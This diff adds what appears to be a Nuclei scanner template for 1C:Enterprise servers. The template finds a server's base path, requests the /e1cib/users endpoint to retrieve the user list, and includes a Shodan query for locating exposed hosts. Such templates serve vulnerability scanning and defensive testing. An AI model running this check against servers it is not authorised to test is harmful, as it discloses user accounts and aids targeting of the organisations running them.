@@ -1,0 +1,47 @@
+id: 1c-enterprise-users
+
+info:
+  name: 1C Enterprise User disclosure
+  author: gtrrnr
+  severity: medium
+  description: Get list of users from 1C Enterprise server
+  tags: misc,1c,1c_enterprise
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: http.title:"1C:Enterprise"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /{{basepath}}/e1cib/users HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_2 == 200
+          - contains(content_type_2, 'text/plain')
+          - content_length_2 > 3
+          - contains(tolower(header_2), 'vrs-rc')
+        condition: and
+
+    extractors:
+      - type: regex
+        name: basepath
+        group: 1
+        regex:
+          - '[Vv][Aa][Rr] [Bb][Aa][Ss][Ee] = "(.+)"'
+        internal: true
+        part: body
+
+      - type: regex
+        group: 1
+        regex:
+          - "(.+)"
+        part: body_2
